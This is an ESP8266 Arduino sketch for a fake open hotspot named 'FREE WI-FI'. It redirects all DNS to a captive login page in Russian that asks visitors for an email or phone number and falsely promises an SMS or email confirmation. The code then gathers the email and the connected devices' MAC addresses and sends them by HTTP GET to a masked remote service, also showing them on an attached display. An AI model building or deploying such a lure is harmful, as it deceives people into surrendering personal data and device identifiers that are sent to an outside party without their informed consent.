#include <SPI.h>
#include <Wire.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266WiFiMulti.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClient.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

Adafruit_SSD1306 display(-1);
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WiFiMulti wifiMulti;
ESP8266WebServer webServer(80);
HTTPClient http;

const byte DNS_PORT = 53;

const char *ssid1 = "******";
const char *password1 = "******";
const char *ssid2 = "******";
const char *password2 = "******";
String service = "******";

String nameSsid = "FREE WI-FI";
String loginForm = "<!DOCTYPE html><html><head> <meta charset='utf-8' name='viewport' content='width=device-width, initial-scale=1'> <style>html{height: 100%;}body{height: 100%; font-family: Arial, Helvetica, sans-serif;}*{box-sizing: border-box;}.container{height: 100%; position: relative; border-radius: 5px; background-color: #f2f2f2; padding: 20px 0 30px 0;}input{width: 100%; padding: 12px; border: none; border-radius: 4px; margin: 5px 0; opacity: 0.85; display: inline-block; font-size: 17px; line-height: 20px; text-decoration: none;}input:hover{opacity: 1;}input[type=submit]{background-color: #4CAF50; color: white; cursor: pointer;}input[type=submit]:hover{background-color: #45a049;}.col{max-width: 640px; margin: auto; padding: 0 50px; margin-top: 6px;}.row:after{content: ''; display: table; clear: both;}@media screen and (max-width: 650px){.col{width: 100%; margin-top: 0;}}</style></head><body><div class='container'> <form action='/login' method='post'> <div class='row'><h2 style='text-align:center'>Авторизация</h2> <div class='col'><p>Чтобы войти в сеть необходимо пройти авторизацию, введите свой номер телефона/почту, Вам придет sms/письмо для подтверждения.</p><input minlength='5' maxlength='35' type='text' name='email' placeholder='Почта или номер телефона' required><input type='submit' value='Login'></div></div></form></div></body></html>";
String response = "<h1>Welcome!</h1>";

void setup() {
  Serial.begin(9600);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(nameSsid);

  wifiMulti.addAP(ssid1, password1);
  wifiMulti.addAP(ssid2, password2);

  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.onNotFound(showLoginForm);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.begin();
}

void showLoginForm() {
  webServer.send(200, "text/html", loginForm);
}

void handleLogin() {
  if (!webServer.hasArg("email")) {
    return;
  }
  String email = String(webServer.arg("email"));
  display.clearDisplay();
  display.setCursor(0,0);
  display.setTextColor(WHITE);
  display.setTextSize(1);

  struct station_info *stat_info;
  struct ip_addr *IPaddress;

  stat_info = wifi_softap_get_station_info();

  String mac = "";
  while (stat_info != NULL) {
    mac = String(stat_info->bssid[0], HEX) + ":" +
      String(stat_info->bssid[1],HEX) + ":" +
      String(stat_info->bssid[2],HEX) + ":" +
      String(stat_info->bssid[3],HEX) + ":" +
      String(stat_info->bssid[4],HEX) + ":" +
      String(stat_info->bssid[5],HEX) + ":";
    Serial.print("mac " + mac);
    stat_info = STAILQ_NEXT(stat_info, next);
  }

  String payload = "";
  if (WiFi.status() == WL_CONNECTED) {
    String url = service + "?email=" + email + "&macAddress=" + mac + "&fromSocial=notImplement";
    http.begin(url);
    int httpCode = http.GET();
    if (httpCode > 0) {
      payload = http.getString();
      Serial.println(payload);
    }
    http.end();
  } else {
    payload = "Wifi not connected";
  }

  display.println(email);
  display.println(mac);
  display.println(payload);
  display.display();

  webServer.send(200, "text/html", response);
}

void loop() {
  if (wifiMulti.run() != WL_CONNECTED) {
    Serial.println("WiFi not connected!");
    delay(1000);
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
